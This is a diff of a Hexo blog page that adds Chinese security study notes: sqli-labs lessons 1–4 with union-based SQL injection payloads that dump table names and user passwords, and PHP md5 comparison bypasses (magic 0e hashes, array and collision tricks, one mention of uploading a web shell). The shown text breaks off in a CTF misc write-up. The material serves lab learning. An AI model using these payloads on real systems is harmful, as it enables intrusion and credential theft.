@@ -152,30 +152,27 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-My-New-Post" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs靶场学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/02/13/My-New-Post/">test your nc</a>
-    </h1>
-  
-
-        
-        <a href="/2023/02/13/My-New-Post/" class="archive-article-date">
-  	<time datetime="2023-02-13T08:19:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-02-13</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>我的文章摘要….</p>
-        
-          <a class="article-more-a" href="/2023/02/13/My-New-Post/#more">more >></a>
-        
+        <h2 id="sqli-labs靶场学习"><a href="#sqli-labs靶场学习" class="headerlink" title="sqli-labs靶场学习"></a>sqli-labs靶场学习</h2><h4 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#联合注入字符型</span><br><span class="line">?id=1&#x27;				#错误显示</span><br><span class="line">?id=1&#x27;--+			#正常显示，为字符型注入</span><br><span class="line">?id=1&#x27; order by 3 --+	#判断列数</span><br><span class="line">?id=-1 union select 1,2,3		#爆出显示位</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<h4 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#联合注入数字型</span><br><span class="line">&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;</span><br><span class="line">&quot;SELECT * FROM users WHERE id=1 &#x27; LIMIT 0,1&quot;出错信息。</span><br><span class="line"> </span><br><span class="line"> #数字型</span><br><span class="line">?id=1 order by 3</span><br><span class="line">?id=-1 union select 1,2,3</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h4><p>![](C:\Users\tong\Pictures\Screenshots\屏幕截图 2023-10-17 170104.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#联合注入字符型</span><br><span class="line">?id=2&#x27;)--+</span><br><span class="line">?id=1&#x27;) order by 3--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>
+
+
+
+
       
 
       
@@ -183,22 +180,11 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">hexo</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2023/02/13/My-New-Post/">展开全文 >></a>
+          <a class="article-more-a" href="/2023/10/20/sqli-labs%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/">展开全文 >></a>
         </p>
       
 
@@ -228,39 +214,30 @@
 
 
   
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-web学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/02/13/hello-world/">Hello World</a>
-    </h1>
-  
-
-        
-        <a href="/2023/02/13/hello-world/" class="archive-article-date">
-  	<time datetime="2023-02-13T08:05:01.997Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-02-13</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+        <h3 id="web学习"><a href="#web学习" class="headerlink" title="web学习"></a>web学习</h3><h4 id="PHPMD5绕过"><a href="#PHPMD5绕过" class="headerlink" title="PHPMD5绕过"></a>PHPMD5绕过</h4><h4 id="1-“oe”-绕过"><a href="#1-“oe”-绕过" class="headerlink" title="1 “oe” 绕过"></a>1 “oe” 绕过</h4><p>​		因为处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 0E开头的，那么PHP会认为它们相同</p>
+<p>​		基本的原理是这样的，但更严谨的字符串格式是，<code>0e</code> 开头，同时后面都是数字，不能包含其他字符的字符串，md5 值才会相等（<code>==</code> 的结果为 True，但 <code>===</code> 的结果为 False）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s878926199a&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;s155964671a&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span> . <span class="string">&quot;--&gt;&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span> . <span class="string">&quot;--&gt;&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="comment">// s878926199a--&gt;0e545993274517709034328855841020</span></span><br><span class="line"><span class="comment">// s155964671a--&gt;0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(true)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字 vs 数字</span></span><br><span class="line"><span class="variable">$a1</span> = <span class="string">&quot;0e33&quot;</span>;</span><br><span class="line"><span class="variable">$b1</span> = <span class="string">&quot;0e89&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="variable">$a1</span> == <span class="variable">$b1</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(true)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字 vs 字母</span></span><br><span class="line"><span class="variable">$a3</span> = <span class="string">&quot;0eadd&quot;</span>;</span><br><span class="line"><span class="variable">$b3</span> = <span class="string">&quot;0e232&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="variable">$a3</span> == <span class="variable">$b3</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(false)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字 vs 数字/字母</span></span><br><span class="line"><span class="variable">$a4</span> = <span class="string">&quot;0ea34343dd&quot;</span>;</span><br><span class="line"><span class="variable">$b4</span> = <span class="string">&quot;0e232&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="variable">$a4</span> == <span class="variable">$b4</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(false)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>利用</p>
+<p>常见的 md5 值是 <code>0e</code> 开头且后面均为数字的字符串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"><span class="number">240610708</span> </span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br><span class="line"><span class="number">314282422</span> </span><br><span class="line"><span class="number">0e990995504821699494520356953734</span></span><br><span class="line"><span class="number">571579406</span> </span><br><span class="line"><span class="number">0e972379832854295224118025748221</span></span><br><span class="line"><span class="number">903251147</span> </span><br><span class="line"><span class="number">0e174510503823932942361353209384</span></span><br><span class="line"><span class="number">1110242161</span> </span><br><span class="line"><span class="number">0e435874558488625891324861198103</span></span><br><span class="line"><span class="number">1320830526</span> </span><br><span class="line"><span class="number">0e912095958985483346995414060832</span></span><br><span class="line"><span class="number">1586264293</span> </span><br><span class="line"><span class="number">0e622743671155995737639662718498</span></span><br><span class="line"><span class="number">2302756269</span> </span><br><span class="line"><span class="number">0e250566888497473798724426794462</span></span><br><span class="line"><span class="number">2427435592</span> </span><br><span class="line"><span class="number">0e067696952328669732475498472343</span></span><br><span class="line"><span class="number">2653531602</span> </span><br><span class="line"><span class="number">0e877487522341544758028810610885</span></span><br><span class="line"><span class="number">3293867441</span> </span><br><span class="line"><span class="number">0e471001201303602543921144570260</span></span><br><span class="line"><span class="number">3295421201</span> </span><br><span class="line"><span class="number">0e703870333002232681239618856220</span></span><br><span class="line"><span class="number">3465814713</span> </span><br><span class="line"><span class="number">0e258631645650999664521705537122</span></span><br><span class="line"><span class="number">3524854780</span> </span><br><span class="line"><span class="number">0e507419062489887827087815735195</span></span><br><span class="line"><span class="number">3908336290</span> </span><br><span class="line"><span class="number">0e807624498959190415881248245271</span></span><br><span class="line"><span class="number">4011627063</span> </span><br><span class="line"><span class="number">0e485805687034439905938362701775</span></span><br><span class="line"><span class="number">4775635065</span> </span><br><span class="line"><span class="number">0e998212089946640967599450361168</span></span><br><span class="line"><span class="number">4790555361</span> </span><br><span class="line"><span class="number">0e643442214660994430134492464512</span></span><br><span class="line"><span class="number">5432453531</span> </span><br><span class="line"><span class="number">0e512318699085881630861890526097</span></span><br><span class="line"><span class="number">5579679820</span> </span><br><span class="line"><span class="number">0e877622011730221803461740184915</span></span><br><span class="line"><span class="number">5585393579</span> </span><br><span class="line"><span class="number">0e664357355382305805992765337023</span></span><br><span class="line"><span class="number">6376552501</span> </span><br><span class="line"><span class="number">0e165886706997482187870215578015</span></span><br><span class="line"><span class="number">7124129977</span> </span><br><span class="line"><span class="number">0e500007361044747804682122060876</span></span><br><span class="line"><span class="number">7197546197</span> </span><br><span class="line"><span class="number">0e915188576072469101457315675502</span></span><br><span class="line"><span class="number">7656486157</span> </span><br><span class="line"><span class="number">0e451569119711843337267091732412</span></span><br><span class="line">QLTHNDT </span><br><span class="line"><span class="number">0e405967825401955372549139051580</span></span><br><span class="line">QNKCDZO </span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">EEIZDOI </span><br><span class="line"><span class="number">0e782601363539291779881938479162</span></span><br><span class="line">TUFEPMC </span><br><span class="line"><span class="number">0e839407194569345277863905212547</span></span><br><span class="line">UTIPEZQ </span><br><span class="line"><span class="number">0e382098788231234954670291303879</span></span><br><span class="line">UYXFLOI </span><br><span class="line"><span class="number">0e552539585246568817348686838809</span></span><br><span class="line">IHKFRNS </span><br><span class="line"><span class="number">0e256160682445802696926137988570</span></span><br><span class="line">PJNPDWY </span><br><span class="line"><span class="number">0e291529052894702774557631701704</span></span><br><span class="line">ABJIHVY </span><br><span class="line"><span class="number">0e755264355178451322893275696586</span></span><br><span class="line">DQWRASX </span><br><span class="line"><span class="number">0e742373665639232907775599582643</span></span><br><span class="line">DYAXWCA </span><br><span class="line"><span class="number">0e424759758842488633464374063001</span></span><br><span class="line">GEGHBXL </span><br><span class="line"><span class="number">0e248776895502908863709684713578</span></span><br><span class="line">GGHMVOE </span><br><span class="line"><span class="number">0e362766013028313274586933780773</span></span><br><span class="line">GZECLQZ </span><br><span class="line"><span class="number">0e537612333747236407713628225676</span></span><br><span class="line">NWWKITQ </span><br><span class="line"><span class="number">0e763082070976038347657360817689</span></span><br><span class="line">NOOPCJF </span><br><span class="line"><span class="number">0e818888003657176127862245791911</span></span><br><span class="line">MAUXXQC </span><br><span class="line"><span class="number">0e478478466848439040434801845361</span></span><br><span class="line">MMHUWUV </span><br><span class="line"><span class="number">0e701732711630150438129209816536</span></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<h4 id="数组绕过（PHP-8-无法绕过）"><a href="#数组绕过（PHP-8-无法绕过）" class="headerlink" title="数组绕过（PHP 8 无法绕过）"></a>数组绕过（PHP 8 无法绕过）</h4><p>在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 <code>==</code> 和 <code>===</code> 比较的结果均为 True</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /param.php?a[]=1&amp;b[]=2</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(PHP_VERSION . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+<h4 id="md5-碰撞"><a href="#md5-碰撞" class="headerlink" title="md5 碰撞"></a>md5 碰撞</h4><p>利用 fastcoll 进行 md5 碰撞，生成两个字面值不同但 md5 相同的文件。<br>新建一个空的 txt 文档。</p>
+<p>然后拖到 exe 上，自动生成两个文件。</p>
+<p>得到两个文件，通过代码读取即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;D:tmp\a_msg1.txt&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;D:tmp\a_msg2.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span> === <span class="variable">$b</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(true)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木马</p>
 
       
 
@@ -273,7 +250,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2023/02/13/hello-world/">展开全文 >></a>
+          <a class="article-more-a" href="/2023/09/28/web%E5%AD%A6%E4%B9%A0/">展开全文 >></a>
         </p>
       
 
@@ -303,6 +280,542 @@
 
 
   
+    <article id="post-SH-misc" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><p>连续base64解码两次</p>
+<p>flag{this_is_flag}</p>
+<h4 id="栅栏里的大帝"><a href="#栅栏里的大帝" class="headerlink" title="栅栏里的大帝"></a>栅栏里的大帝</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">string,number</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+(<span class="built_in">ord</span>(i)-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)-space2)%<span class="number">26</span>),end = <span class="string">&#x27;&#x27;</span>)</span><br><span 